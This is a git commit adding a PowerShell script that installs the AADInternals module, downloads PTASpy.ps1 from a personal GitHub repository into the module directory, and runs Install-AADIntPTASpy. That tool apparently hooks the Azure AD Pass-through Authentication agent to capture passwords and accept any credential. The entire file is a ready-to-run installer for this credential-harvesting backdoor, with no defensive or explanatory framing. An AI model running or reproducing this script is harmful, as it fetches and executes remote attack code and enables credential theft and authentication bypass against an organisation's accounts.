cdc752f2b9ca503f76f98e9e3320b2ddb60cf323
Ma Hoang Minh <68465390+kenji-winux@users.noreply.github.com>
2024-07-17 10:09:22 +0700

    Add files via upload

---
+++ Install-PTASpy.ps1
@@ -0,0 +1,10 @@
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+
+Install-Module aadinternals -Confirm:$false -Force
+Import-Module aadinternals
+
+curl https://raw.githubusercontent.com/kenji-winux/public-folder/main/PTASpy.ps1 -o "C:\Program Files\WindowsPowerShell\Modules\AADInternals\0.9.3\PTASpy.ps1"
+Import-Module aadinternals -Force
+
+
+Install-AADIntPTASpy
